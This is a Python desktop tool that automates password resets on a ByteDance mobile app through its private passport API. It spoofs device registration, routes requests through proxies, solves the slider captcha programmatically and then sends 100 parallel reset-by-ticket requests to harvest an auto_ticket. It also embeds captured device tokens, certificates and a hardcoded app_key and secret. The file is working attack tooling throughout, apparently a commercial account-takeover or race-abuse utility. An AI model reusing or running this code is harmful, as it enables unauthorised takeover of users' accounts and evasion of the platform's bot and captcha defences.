import json
import os
import random
import traceback
import urllib
import requests
import wx
import threading
import time
from datetime import datetime
from loguru import logger
from card_password import read_card_password, init_card_password

# 方法：为未在环境中设置的项提供默认值（不覆盖 .env/系统环境中的值）
os.environ.setdefault("PROXY_ENABLED", "true")
os.environ.setdefault("PROXY_BASE_URL", "http://206.237.13.225:9999/proxy")
try:
    from module import proxy_patch  # noqa: F401
except Exception as _:
    print(_)
    # 若代理模块导入失败，不影响原有逻辑
    raise _

from module.six_god2.抖音设备注册 import device_register
from concurrent.futures import ThreadPoolExecutor
from module.TTEncrypt import TT
from module.six_god2.captcha import ByteDanceCaptchaAndroid
# t = TT()
# e = t.encrypt


def get_proxies(api_url):
    print(api_url)
    if isinstance(api_url, dict):
        return api_url
    for i in range(3):
        try:
            proxy_ip = requests.get(api_url).text
            print(f"获取到代理IP:{proxy_ip}")
            if not proxy_ip or 'error' in proxy_ip:
                raise Exception(f"获取代理IP失败:{proxy_ip}")
            # 用户名密码认证(私密代理/独享代理)
            proxies = {
                'http': f'http://{proxy_ip}',
                'https': f'http://{proxy_ip}',
            }
            return proxies
        except Exception as e:
            logger.error(f"获取代理IP失败:{e},重试{i}/3次")
            time.sleep(random.randint(1, 3))
            continue
    raise Exception("获取代理IP失败")


def xor_encrypt(s):
    """对手机号进行异或加密。"""
    chars = '0123456789abcdef'
    arr = [i ^ 5 for i in s.encode()]
    result = ''.join([chars[(b & 255) >> 4] + chars[(b & 255) & 15] for b in arr])
    return result


def submit_code(device_id, iid,mobile, code, proxies):
    url = "https://api5-normal-c-lf.amemv.com/passport/user/get_brief_info_by_sms/"
    params = {
        "passport-sdk-version": "601441",
        "request_from_account_sdk": "1",
        "is_from_ttaccountsdk": "1",
        "info_scope": "user_info,assist_account_info,verify_ticket,oper_staff_relation",
        "code": xor_encrypt(code),
        "need_block_unregister": "true",
        "mix_mode": "1",
        "mobile": xor_encrypt(mobile),
        "type": "31",
        "multi_login": "1",
        "account_sdk_source": "app",
        "passport_support_flow": "choose_account,captcha,real_name_check,verify",
        "iid": iid,
        "device_id": device_id,
        "ac": "wifi",
        "channel": "xiaomi_1128_64",
        "aid": "1349",
        "app_name": "maya",
        "version_code": "370300",
        "version_name": "37.3.0",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "device_type": "OPPO A4",
        "device_brand": "OPPO",
        "language": "zh",
        "os_api": "33",
        "os_version": "13",
        "manifest_version_code": "370301",
        "resolution": "1080*2132",
        "dpi": "450",
        "update_version_code": "37309900",
        "_rticket": "1768058878774",
        "package": "my.maya.android",
        "first_launch_timestamp": "1767987019",
        "last_deeplink_update_version_code": "0",
        "cpu_support64": "true",
        "host_abi": "arm64-v8a",
        "is_guest_mode": "0",
        "app_type": "normal",
        "minor_status": "0",
        "appTheme": "light",
        "is_preinstall": "0",
        "need_personal_recommend": "1",
        "is_android_pad": "0",
        "is_android_fold": "0",
        "ts": "1768058877",
        "cdid": "ab91036f-e205-49fa-a251-91b4526d50b2",
        "cronet_version": "6f1e308d_2025-12-08",
        "ttnet_version": "4.2.243.28-douyin",
        "use_store_region_cookie": "1"
    }

    headers = {
        'User-Agent': "my.maya.android/370301 (Linux; U; Android 13; zh_CN; OPPO A4; Build/TQ3A.230705.001; Cronet/TTNetVersion:6f1e308d 2025-12-08 QuicVersion:21ac1950 2025-11-18)",
        'x-tt-passport-csrf-token': "ef317ef23dfeaf3d4c3e633b87183063",
        'x-tt-dt': "AAA52GUO7X5BYDNQY4N7UJMC6NRX7FMJQ4XMASHYM6NWNJRGKD2GE36RWJWP6MGR5D5KCTNJRZMP5YXVPBA4N4JAPI3XNNUFIO7WU57VPI6VPXQKYYFF7HSIX2GVGHJ34IJFDWWXLRYDCPY5IXNBP5A",
        'activity_now_client': "0",
        'x-tt-device-dtrait': "a0_p4ecU8MMjWPZbZ+IZ/Lxk41S1sp0I4FL0XJL/G0cPMlYrTCs3d59C4U/5+0mKMfnB7UOT6TVTed9kGu81vaVfP5ZcDmRc3p1guisc8Wmw/V371StHs6dWBLTYOwcsqSlSg3rohv2APqyinbkpyylAXOxVV7d6kYX0kp1i/7howVDZpz6a57fmh/yuIfj2xXvGXJHnQe8h8o59yP/53e4voZPesvi2+3T4HvQ4dlKB12+ZjWh4ogJ8hE1V1m3xtbMO0ASatyIrMe59S6G7dr/BOZRsgCsUltGA1BKEqOs62CX8x5ouEt9OwAtylhr4oX63wDI6Kviwc/tI6Hh6OiBrQ==",
        'x-ss-req-ticket': "1768058878778",
        'bd-ticket-guard-display-os-version': "TQ3A.230705.001",
        'bd-ticket-guard-ree-public-key': "BMsSka9z6CsryqgjQ98evxgSBCDoTrI2AJwJdPU224x3iJQWOP9IlV8sZ73CXcusSmCF8nN+feewLP28DwqFDYM=",
        'bd-ticket-guard-version': "3",
        'passport-sdk-settings': "x-tt-token",
        'passport-sdk-sign': "x-tt-token",
        'bd-ticket-guard-tee-status': "0",
        'sdk-version': "2",
        'bd-ticket-guard-iteration-version': "2",
        'bd-ticket-guard-client-cert': "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNERENDQWJPZ0F3SUJBZ0lVS09CeDFJbUE4S3lJMGJjdUdJa20yd1RZajhvd0NnWUlLb1pJemowRUF3SXcKTVRFTE1Ba0dBMVVFQmhNQ1EwNHhJakFnQmdOVkJBTU1HWFJwWTJ0bGRGOW5kV0Z5WkY5allWOWxZMlJ6WVY4eQpOVFl3SGhjTk1qWXdNVEE1TVRrek1EVXdXaGNOTXpZd01URXdNRE16TURVd1dqQTdNUWt3QndZRFZRUUdFd0F4CkNUQUhCZ05WQkFvVEFERUpNQWNHQTFVRUN4TUFNUmd3RmdZRFZRUURFdzlpWkMxMGFXTnJaWFF0WjNWaGNtUXcKV1RBVEJnY3Foa2pPUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVFFWm9CTGZGT0g2MHRYbklkUHVKdGJwN2trRS9ZeApJVmxGZzVMZFhEa0FxZXdBVW5rZHY0QXV0QVVpTGY4djNpUFhxNnE4OC96UDAzckEwWXJna205dm80R2VNSUdiCk1BNEdBMVVkRHdFQi93UUVBd0lGb0RBeEJnTlZIU1VFS2pBb0JnZ3JCZ0VGQlFjREFRWUlLd1lCQlFVSEF3SUcKQ0NzR0FRVUZCd01EQmdnckJnRUZCUWNEQkRBcEJnTlZIUTRFSWdRZ3FRZE5wN01vc0U3ckFhYlZvemtJZ0R3MAo2b3U0NTk4RjlWRmowNTFVeUZZd0t3WURWUjBqQkNRd0lvQWdNcVZuNm81a1NCS056RTVOUUh0ekZKdEhiVk42CnBOR0ExM21VbDNzaVI0TXdDZ1lJS29aSXpqMEVBd0lEUndBd1JBSWdjMHpLT0E3MzZnN3ZTWlF2MytTSUhXcmQKMkZBbkdMa2l6Zjl0bm5iYzJSNENJRlZ2NlhxS0l2eDhnT0V0QWFCdHlCb2xlTzFqREhITTB0UkRTRVFoNnFGVAotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==",
        'bd-ticket-guard-server-cert-sn': "533240336124694022040808462028007165443034493949",
        'x-tt-passport-trace-id': "login_b9da868878da465582c6b102eb28b981",
        'x-tt-passport-verify-portrait': "65658814-03f0-4704-b98f-3a10c0f4716a.login",
        'passport-sdk-version': "601441",
        'x-vc-bdturing-sdk-version': "4.1.1.cn",
        'x-tt-bdturing-retry': "1",
        'x-tt-passport-replay-params': "{}",
        'x-tt-request-tag': "s=0;p=0",
        'x-ss-dp': "1349",
        'x-tt-trace-id': "00-a885d21f0d5e96614a0d80a115cf0545-a885d21f0d5e9661-01",
        # 'x-argus': "FXBiaQ==",
        # 'x-gorgon': "8404c0b00000b0ea5cddb77a24dab227e73e54af8b450b6952cc",
        # 'x-helios': "Rq8FawlX3Gv1gery1MYxktRILE3l/R4sTenXFLrF7KXxSPJX",
        # 'x-khronos': "1768058901",
        # 'Cookie': "odin_tt=016d6ec4a474604b4cb0725921bfdb36cf902b722302e0d0f341192835a107a94d845940749d8450a49edbe5fc05442b20aa0989ff252c5df068ca658f4a3441be26848597531d2860c6719fecf56d5c; passport_csrf_token=ef317ef23dfeaf3d4c3e633b87183063; passport_csrf_token_default=ef317ef23dfeaf3d4c3e633b87183063; install_id=3845430601590171; ttreq=1$1ff56c03353404ff59dee63f105e56abf50e4fcc"
    }

    response = requests.get(url, params=params, headers=headers, proxies=proxies).json()
    if 'data' in response and response['data'].get('error_code') == 1105:

        hk = ByteDanceCaptchaAndroid(did=device_id, iid=iid,
                                     detail=json.loads(response['data']['verify_center_decision_conf'])[
                                         'detail'], proxy=proxies).verify_track()

        # print(hk)
        logger.debug(f"滑块返回值：{hk}")
        response = requests.get(url, params=params, headers=headers, proxies=proxies).json()
    logger.debug(f"提交验证码成功：{response}")
    return response


def change_pwd(device_id, iid, ticket, sec_uid, new_password='qwe123123', proxies=None):
    url = "https://api3-normal-c-lf.amemv.com/passport/password/reset_by_ticket/"
    params = {
        "passport-sdk-version": "601441",
        "request_from_account_sdk": "1",
        "is_from_ttaccountsdk": "1",
        "iid": iid,
        "device_id": device_id,
        "ac": "wifi",
        "channel": "50067829a",
        "aid": "1349",
        "app_name": "maya",
        "version_code": "370300",
        "version_name": "37.3.0",
        "device_platform": "android",
        "os": "android",
        "ssmix": "a",
        "device_type": "OPPO A4",
        "device_brand": "OPPO",
        "language": "zh",
        "os_api": "33",
        "os_version": "13",
        "manifest_version_code": "370301",
        "resolution": "1080*2132",
        "dpi": "450",
        "update_version_code": "37309900",
        "_rticket": "1768059484555",
        "package": "my.maya.android",
        "first_launch_timestamp": "1767987019",
        "last_deeplink_update_version_code": "0",
        "cpu_support64": "true",
        "host_abi": "arm64-v8a",
        "is_guest_mode": "0",
        "app_type": "normal",
        "minor_status": "0",
        "appTheme": "light",
        "is_preinstall": "0",
        "need_personal_recommend": "1",
        "is_android_pad": "0",
        "is_android_fold": "0",
        "ts": "1768059479",
        "cdid": "ab91036f-e205-49fa-a251-91b4526d50b2",
        "cronet_version": "6f1e308d_2025-12-08",
        "ttnet_version": "4.2.243.28-douyin",
        "use_store_region_cookie": "1"
    }
    # 构建请求数据
    data = {
        "is_vcd": "0",
        "reg_cookie_opt": "true",
        "password": xor_encrypt(new_password),
        "account_sdk_source": "app",
        "ticket": ticket,
        "sec_uid": sec_uid,
        "passport_support_flow": "real_name_check,choose_account,captcha,verify",
        "mix_mode": "1",
        "user_api_need_combine": "1",
        "ignore_reused_mobile": "true",
        "multi_login": "1",
    }
    print(data)
    for i in range(3):
        try:
            t = TT()
            e = t.encrypt
            payload = e(urllib.parse.urlencode(data))
            break
        except:
            continue
    else:
        raise Exception("change_pwd failed")
    headers = {
        #
        # "sdk-version": "2",
        # "bd-ticket-guard-iteration-version": "2",
        # "bd-ticket-guard-client-cert": "LS0tLS1CRUdJTiBVDRUalJTE1Ba0dBMVVFQmhNQ1EwNHhJakFnQmdOVkJBTU1HWFJwWTJ0bGRGOW5kV0Z5WkY5allWOWxZMlJ6WVY4eQpOVFl3SGhjTk1qVXhNakk1TVRNd056QTFXaGNOTXpVeE1qSTVNakV3TnpBMVdqQTdNUWt3QndZRFZRUUdFd0F4CkNUQUhCZ05WQkFvVEFERUpNQWNHQTFVRUN4TUFNUmd3RmdZRFZRUURFdzlpWkMxMGFXTnJaWFF0WjNWaGNtUXcKV1RBVEJnY3Foa2pPUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVM3UHIwWStudmYvczc1VFAvaWhjS2F3Ujd2RFY3UwpUNnYxUEpiTkhITW9MTlFpSVhwbUxnQ0tmN1JDeHVYRnR5OE5nY0JHd0dJT0NiSnNUZk4wTWhLOW80R2VNSUdiCk1BNEdBMVVkRHdFQi93UUVBd0lGb0RBeEJnTlZIU1VFS2pBb0JnZ3JCZ0VGQlFjREFRWUlLd1lCQlFVSEF3SUcKQ0NzR0FRVUZCd01EQmdnckJnRUZCUWNEQkRBcEJnTlZIUTRFSWdRZ3hQN28rUy9RbTc3bzVBNlR3ZHE2SS9EbgpXL1V3Z0FibUlnc3BDYitFK1N3d0t3WURWUjBqQkNRd0lvQWdNcVZuNm81a1NCS056RTVOUUh0ekZKdEhiVk42CnBOR0ExM21VbDNzaVI0TXdDZ1lJS29aSXpqMEVBd0lEU1FBd1JnSWhBTEorVmZ4T09rRldFRlZhV3pCZUQ1c2IKQmdhUmUwVFRpcTQzWXVUamtRSmdBaUVBdms4b3pUVzVkWW5teTVvQ2xKSjVGa01RdGpmYSswYmRFVStUdVRiegpjc2c9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K",
        # "bd-ticket-guard-server-cert-sn": "5332403361246962028007165443034493949",
        # "x-tt-passport-trace-id": "login_56c6f1b921cc462f4079f0",
        # "x-tt-passport-verify-portrait": "258f963d-975f-401e-84ab-6c111dd4afa8.login",
        # "passport-sdk-version": "601389",
        # "x-vc-bdturing-sdk-version": "4.0.5.cn",
        # "x-tt-cipher-version": "1.0.0",
        "x-tt-encrypt-info": "1",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        # "x-ss-stub": "1BEA3972A9FB41C1F85BE64E8E935642",
        # "x-tt-request-tag": "s=-1;p=0",
        "x-ss-dp": "615883",
    }
    response = requests.post(url, params=params, data=payload, headers=headers, proxies=proxies)

    # print(response.text)
    # print(len(response.text))
    
    # 返回响应结果
    try:
        return response.json()
    except Exception:
        return None


def test_main():
    """测试主函数，用于参考的逻辑流程"""
    device_info = device_register()
    did = device_info['device_id_str']
    iid = device_info['install_id_str']
    phone = '+1 16727772140'
    code = '7532'
    submit_response = submit_code(did, iid, phone, code, proxies)
    ticket = submit_response["data"]["verify_ticket"]
    sec_uid = submit_response["data"]["sec_uid"]
    logger.debug(f"ticket: {ticket}")
    logger.debug(f"sec_uid: {sec_uid}")
    logger.debug(f"开始改密")
    change_pwd(did, iid, ticket, sec_uid)


class ChangePasswordFrame(wx.Frame):
    """修改密码主窗口类"""
    
    def __init__(self, parent=None):
        super().__init__(parent, title="修改密码工具", size=(700, 300))
        
        # 初始化变量
        self.is_running = False
        self.success_count = 0
        self.fail_count = 0
        self.total_count = 100

        # 创建主面板
        self.create_ui()
        
        # 居中显示
        self.Centre()
    
    def create_ui(self):
        """创建用户界面"""
        panel = wx.Panel(self)
        main_sizer = wx.BoxSizer(wx.VERTICAL)
        
        # 标题
        title = wx.StaticText(panel, label="修改密码工具")
        title_font = wx.Font(12, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD)
        title.SetFont(title_font)
        main_sizer.Add(title, 0, wx.ALL | wx.ALIGN_CENTER, 5)
        
        # 分隔线
        line = wx.StaticLine(panel)
        main_sizer.Add(line, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # 代理输入区域
        proxy_sizer = wx.BoxSizer(wx.HORIZONTAL)
        proxy_label = wx.StaticText(panel, label="代理：")
        self.proxy_input = wx.TextCtrl(panel)
        proxy_sizer.Add(proxy_label, 0, wx.ALL | wx.CENTER, 3)
        proxy_sizer.Add(self.proxy_input, 1, wx.ALL | wx.EXPAND, 3)

        main_sizer.Add(proxy_sizer, 0, wx.EXPAND | wx.ALL, 3)

        # 输入区域 - 三个输入框合并为一行
        input_box = wx.StaticBox(panel, label="输入信息")
        input_sizer = wx.StaticBoxSizer(input_box, wx.HORIZONTAL)
        
        # 手机号输入
        phone_label = wx.StaticText(panel, label="手机号：")
        self.phone_input = wx.TextCtrl(panel)
        input_sizer.Add(phone_label, 0, wx.ALL | wx.CENTER, 3)
        input_sizer.Add(self.phone_input, 1, wx.ALL | wx.EXPAND, 3)
        
        # 验证码输入
        code_label = wx.StaticText(panel, label="验证码：")
        self.code_input = wx.TextCtrl(panel)
        input_sizer.Add(code_label, 0, wx.ALL | wx.CENTER, 3)
        input_sizer.Add(self.code_input, 1, wx.ALL | wx.EXPAND, 3)

        # 密码输入
        password_label = wx.StaticText(panel, label="新密码：")
        self.password_input = wx.TextCtrl(panel, value="qwe123123")
        input_sizer.Add(password_label, 0, wx.ALL | wx.CENTER, 3)
        input_sizer.Add(self.password_input, 1, wx.ALL | wx.EXPAND, 3)
        
        # 开始改密按钮
        self.start_btn = wx.Button(panel, label="开始改密")
        self.start_btn.SetDefault()
        input_sizer.Add(self.start_btn, 0, wx.ALL | wx.CENTER, 3)
        
        main_sizer.Add(input_sizer, 0, wx.EXPAND | wx.ALL, 5)
        
        # 日志显示区域
        log_box = wx.StaticBox(panel, label="运行日志")
        log_sizer = wx.StaticBoxSizer(log_box, wx.VERTICAL)
        
        self.log_text = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY | wx.TE_WORDWRAP)
        log_sizer.Add(self.log_text, 1, wx.EXPAND | wx.ALL, 3)
        
        main_sizer.Add(log_sizer, 1, wx.EXPAND | wx.ALL, 5)
        
        # 设置布局
        panel.SetSizer(main_sizer)
        
        # 绑定事件
        self.start_btn.Bind(wx.EVT_BUTTON, self.on_start_click)
    
    def append_log(self, message):
        """添加日志消息到文本控件"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        wx.CallAfter(self.log_text.AppendText, log_message)
    
    def update_ticket(self, ticket):
        """更新ticket文本框"""
        wx.CallAfter(self.ticket_text.SetValue, ticket)
    
    def on_start_click(self, event):
        """开始改密按钮点击事件"""
        if self.is_running:
            wx.MessageBox("正在执行中，请稍候...", "提示", wx.OK | wx.ICON_INFORMATION)
            return
        
        # 获取输入
        phone = self.phone_input.GetValue().strip()
        code = self.code_input.GetValue().strip()
        password = self.password_input.GetValue().strip()
        
        # 验证输入
        if not phone:
            wx.MessageBox("请输入手机号", "错误", wx.OK | wx.ICON_ERROR)
            return
        
        if not code:
            wx.MessageBox("请输入验证码", "错误", wx.OK | wx.ICON_ERROR)
            return
        
        if not password:
            wx.MessageBox("请输入新密码", "错误", wx.OK | wx.ICON_ERROR)
            return
        
        # 重置状态
        self.is_running = True
        self.success_count = 0
        self.fail_count = 0
        self.start_btn.Disable()
        self.log_text.Clear()

        # 在新线程中执行
        thread = threading.Thread(target=self.change_password_task, args=(phone, code, password))
        thread.daemon = True
        thread.start()

    def change_password_task(self, phone, code, password):
        """改密任务主函数"""
        try:
            # self.append_log("开始设备注册...")
            proxies_api_url = self.proxy_input.GetValue().strip()
            if not proxies_api_url:
                wx.MessageBox("请输入代理API URL", "错误", wx.OK | wx.ICON_ERROR)
                return

            proxies = get_proxies(proxies_api_url)
            # 步骤1: 设备注册
            device_info = device_register(proxies)
            did = device_info['device_id_str']
            iid = device_info['install_id_str']
            # self.append_log(f"设备注册成功 - Device ID: {did[:20]}...")
            
            # 步骤2: 提交验证码
            self.append_log("正在提交验证码...")
            submit_response = submit_code(did, iid, phone, code, proxies)
            self.append_log(submit_response)
            if 'data' not in submit_response:
                self.append_log("提交验证码失败：响应数据异常")
                wx.CallAfter(self.start_btn.Enable)
                self.is_running = False
                return
            
            ticket = submit_response["data"]["verify_ticket"]
            sec_uid = submit_response["data"]["sec_uid"]
            # self.append_log(f"验证码提交成功 - Ticket: {ticket[:20]}...")
            # self.append_log(f"Sec UID: {sec_uid}")
            
            # 步骤3: 多线程改密（30次）
            self.append_log(f"开始执行改密操作")

            # 使用线程池执行30次改密操作
            pool_list = []
            pool = ThreadPoolExecutor(max_workers=60)
            for i in range(self.total_count):
                pool_list.append(pool.submit(
                    self.single_change_password,
                    did, iid, ticket, sec_uid, password, i + 1, proxies
                ))

                # 稍微延迟，避免并发过高
                time.sleep(0.1)
            
            auto_ticket = None
            for future in pool_list:
                try:
                    result = future.result()
                    if result and result.get('data', {}).get('auto_ticket'):
                        auto_ticket = result.get('data', {}).get('auto_ticket')
                        # 更新ticket文本框
                        # self.update_ticket(auto_ticket)
                        # self.append_log(f"已获取到auto_ticket: {auto_ticket}")
                except Exception as e:
                    # 处理future.result()可能抛出的异常
                    logger.error(f"获取future结果时出错: {str(e)}", exc_info=True)
            
            # 完成
            if auto_ticket:
                self.append_log(f"改密操作已完成 - 已获取auto_ticket")
            else:
                self.append_log(f"改密操作已完成 - 未获取到auto_ticket")
            
        except Exception as e:
            error_msg = f"执行过程中发生错误: {str(e)}"
            self.append_log(error_msg)
            logger.error(error_msg, exc_info=True)
        
        finally:
            # 恢复按钮状态
            wx.CallAfter(self.start_btn.Enable)
            self.is_running = False
    
    def single_change_password(self, device_id, iid, ticket, sec_uid, password, index, proxies):
        """单次改密操作"""
        try:
            # self.append_log(f"[{index}/60] 开始执行改密操作...")
            
            # 调用改密函数，传入密码参数
            result = change_pwd(device_id, iid, ticket, sec_uid, password, proxies)
            
            #
            # self.append_log(f"[{index}/60] 改密操作完成")
            
            # 返回结果
            return result
            
        except Exception as e:
            # 异常处理
            error_msg = f"改密操作失败: {str(e)}"
            self.append_log(error_msg)
            logger.error(error_msg, exc_info=True)
            
            # 返回None表示失败
            return None


class ChangePasswordApp(wx.App):
    """应用程序类"""
    
    def OnInit(self):
        """应用程序初始化"""
        frame = ChangePasswordFrame()
        frame.Show()
        return True


if __name__ == '__main__':

    card_password = read_card_password()
    init_card_password(card_password,app_key='d5ha44bdqusqlm07prr0',app_secret='Qsh68jimHrfOYxRvL264nP1PiHmIru2D')  # 人脸

    # 如果是直接运行，启动GUI界面
    app = ChangePasswordApp()
    app.MainLoop()
    
    # 如果要运行测试函数，可以取消下面的注释
    # test_main()






